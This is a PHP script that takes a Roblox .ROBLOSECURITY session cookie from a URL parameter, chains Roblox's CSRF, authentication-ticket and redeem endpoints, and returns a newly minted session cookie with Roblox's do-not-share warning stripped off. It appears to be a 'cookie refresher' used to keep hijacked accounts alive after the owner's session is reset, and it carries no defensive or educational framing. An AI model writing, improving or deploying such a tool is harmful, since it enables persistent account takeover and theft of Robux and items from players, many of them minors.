<?php

function csrf($cookie) {
 $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("{}")));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Cookie: .ROBLOSECURITY=$cookie"
    ));
    $output = curl_exec($ch);
   preg_match('/X-CSRF-TOKEN:\s*(\S+)/i', $output, $matches);
$csrf = $matches[1];
return $csrf;
}

function ticket($cookie, $csrf) {
     $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("{}")));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/920587237/Adopt-Me",
        "x-csrf-token: " . $csrf,
        "Cookie: .ROBLOSECURITY=$cookie"
    ));
    $output = curl_exec($ch);
    if (curl_errno($ch)) {
        die(curl_error($ch));
    }
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($output, 0, $header_size);
    $body = substr($output, $header_size);
    $ticket = '/rbx-authentication-ticket:\s*([^\s]+)/i';
    if (preg_match($ticket, $header, $matches)) {
        return $matches[1];
    } 
}
function refresh($cookie){
    $csrf = csrf($cookie);
    $authenticationTicket = ticket($cookie, $csrf);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("authenticationTicket" => $authenticationTicket)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type: application/json",
        "origin: https://www.roblox.com",
        "Referer: **https://www.roblox.com/games/920587237/Adopt-Me**",
        "x-csrf-token: " . $csrf,
        "RBXAuthenticationNegotiation: 1"
    ));
    $output = curl_exec($ch);
    if (curl_errno($ch)) {
        die(curl_error($ch));
    }
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($output, 0, $header_size);
    $body = substr($output, $header_size);
    $Bypassed = explode(";", explode(".ROBLOSECURITY=", $output)[1])[0];
    if(empty($Bypassed)){
        return $output;
    }else{
        return $Bypassed;
    }
}
$cum = $_GET['cookie'];
$new = refresh($cum);
$shi = explode("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", $new);
$lol = $shi[1];
if(!$lol){
echo "Invalid Cookie";
}else{
echo $lol;
}
